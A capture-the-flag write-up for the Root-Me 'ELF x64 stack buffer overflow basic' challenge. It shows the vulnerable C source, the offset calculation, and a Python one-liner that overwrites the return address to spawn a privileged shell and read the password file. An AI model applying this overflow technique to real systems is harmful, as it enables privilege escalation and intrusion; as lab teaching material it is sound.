# ELF x64: Stack buffer overflow basic

[root-me challenge](https://www.root-me.org/en/Challenges/App-System/ELF-x64-Stack-buffer-overflow-basic): first step to 64 bits.

Environment configuration:

```text
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 Yes 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 
```

Source code:

```text
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/
 
void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
 
int main(int argc, char **argv){
 
    char buffer[256];
    int len, i;
 
    scanf("%s", buffer);
    len = strlen(buffer);
 
    printf("Hello %s\n", buffer);
 
    return 0;
}
```

----

The program allocates 288 bytes for the function, and 272 bytes for the buffer, before calling the `scanf` function. Write 280 bytes and then the return address (to `callMeMaybe`).

```text
app-systeme-ch35@challenge03:~$ python -c "print 'A'*280 + 'DDDD'" | ./ch35 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Segmentation fault
```

```text
app-systeme-ch35@challenge03:~$ cat <(python -c 'print "A"*280+"\xe7\x05\x40"+"\x00"*5') - | ./ch35
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
id
uid=1135(app-systeme-ch35) gid=1135(app-systeme-ch35) euid=1235(app-systeme-ch35-cracked) groups=1135(app-systeme-ch35),100(users)
cat .passwd
```

## Resources

* [64 Bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf)
